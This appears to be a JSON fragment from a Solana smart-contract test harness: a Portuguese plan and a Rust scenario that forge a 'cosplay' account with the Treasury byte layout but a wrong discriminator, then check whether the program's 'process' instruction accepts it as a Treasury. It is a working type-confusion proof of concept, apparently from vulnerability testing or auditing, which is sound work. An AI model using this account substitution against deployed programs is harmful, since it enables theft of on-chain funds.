  "plan": "Preparamos uma conta Treasury legítima via initialize (baseline) e, em seguida, criamos uma conta 'cosplay' com o mesmo layout de bytes (authority, balance, is_active) mas com um discriminador de 8 bytes diferente do esperado para Treasury. No ataque, passamos essa conta cosplay como `treasury` para `process`. O efeito medido é que a instrução aceita a conta de outro tipo (sucesso) e lê os campos como se fossem de Treasury, demonstrando a falha de validação do discriminador.",
  "scenario": "let authority = Pubkey::new_unique();
let treasury_key = Pubkey::new_unique();

// Baseline: inicializa uma Treasury legítima
let ix_init = env.anchor_ix(
    "initialize",
    &(1000u64,),
    vec![
        AccountMeta::new(treasury_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(solana_program::system_program::id(), false),
    ],
);
let (sys_id, sys_acc) = system_program_account();
let contas_init = vec![
    (treasury_key, empty_account()),
    (authority, wallet(1_000_000_000)),
    (sys_id, sys_acc),
];
let r_init = env.baseline("initialize treasury", &ix_init, &contas_init);

// Conta cosplay: mesmo layout de Treasury, mas com discriminador diferente
let mut cosplay_data = vec![0u8; 8 + 32 + 8 + 1];
// discriminador de outro tipo (ex.: "OtherType")
cosplay_data[0..8].copy_from_slice(&[1, 2, 3, 4, 5, 6, 7, 8]);
// authority (offset 8..40)
cosplay_data[8..40].copy_from_slice(authority.as_ref());
// balance (offset 40..48)
cosplay_data[40..48].copy_from_slice(&500u64.to_le_bytes());
// is_active (offset 48)
cosplay_data[48] = 1;

let cosplay_key = Pubkey::new_unique();
let cosplay_acc = account(&env.program_id, &cosplay_data, None);

// Ataque: process com a conta cosplay no lugar de Treasury
let ix_attack = env.anchor_ix(
    "process",
    &(),
    vec![
        AccountMeta::new_readonly(cosplay_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let contas_attack = vec![
    (cosplay_key, cosplay_acc),
    (authority, wallet(1_000_000_000)),
];
let r = env.attack("process com conta cosplay", &ix_attack, &contas_attack);

if r.program_result == ProgramResult::Success {
    // A conta cosplay foi aceita como Treasury: o discriminador não foi validado
    env.effect(
        "conta de outro tipo aceita como Treasury (discriminador ignorado)",
        true,
    );
    // Verifica que os campos lidos correspondem ao layout da conta cosplay
    let data_after = after(&r, &cosplay_key).data();
    env.effect(
        "authority lida da conta cosplay",
        read_pubkey(data_after, 8) == authority,
    );
    env.effect(
        "balance lido da conta cosplay",
        read_u64(data_after, 40) == 500,
    );
}"
